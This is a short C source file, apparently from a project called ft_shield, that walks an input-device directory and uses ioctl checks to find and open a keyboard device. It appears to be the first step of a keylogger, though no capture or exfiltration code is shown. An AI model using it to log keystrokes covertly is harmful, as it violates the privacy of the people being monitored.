#include "ft_shield.h"

int hasEventTypes(int fd, unsigned long evbit_to_check)
{
	unsigned long evbit = 0;

	ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), &evbit);

	return ((evbit & evbit_to_check) == evbit_to_check);
}

int hasKeys(int fd)
{
	return hasEventTypes(fd, (1 << EV_KEY));
}

int hasRelativeMovement(int fd)
{
	return hasEventTypes(fd, (1 << EV_REL));
}

int hasAbsoluteMovement(int fd)
{
	return hasEventTypes(fd, (1 << EV_ABS));
}

int hasSpecificKeys(int fd, int *keys, size_t num_keys)
{

	size_t nchar = KEY_MAX / 8 + 1;
	unsigned char bits[nchar];

	ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(bits)), &bits);

	for (size_t i = 0; i < num_keys; ++i)
	{
		int key = keys[i];
		if (!(bits[key / 8] & (1 << (key % 8))))
			return 0;
	}
	return 1;
}

int keyboardFound(char *path, int *keyboard_fd)
{
	DIR *dir = opendir(path);
	if (dir == NULL)
		return 0;

	struct dirent *entry;
	while ((entry = readdir(dir)) != NULL)
	{
		if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
			continue;

		char filepath[320];
		snprintf(filepath, sizeof(filepath), "%s/%s", path, entry->d_name);
		struct stat file_stat;
		if (stat(filepath, &file_stat) == -1)
		{
			ft_perror("Error getting file information");
			continue;
		}

		if (S_ISDIR(file_stat.st_mode))
		{
			if (keyboardFound(filepath, keyboard_fd))
			{
				closedir(dir);
				return 1;
			}
		}
		else
		{
			int fd = open(filepath, O_RDONLY);
			int keys_to_check[] = {KEY_Q, KEY_W, KEY_E, KEY_R, KEY_T, KEY_Y, KEY_BACKSPACE, KEY_ENTER, KEY_0, KEY_1, KEY_2, KEY_ESC};
			if (!hasRelativeMovement(fd) && !hasAbsoluteMovement(fd) && hasKeys(fd) && hasSpecificKeys(fd, keys_to_check, 12))
			{
				printf("Keyboard found! File: \"%s\"\n", filepath);
				closedir(dir);
				*keyboard_fd = fd;
				return 1;
			}
			close(fd);
		}
	}

	closedir(dir);
	return 0;
}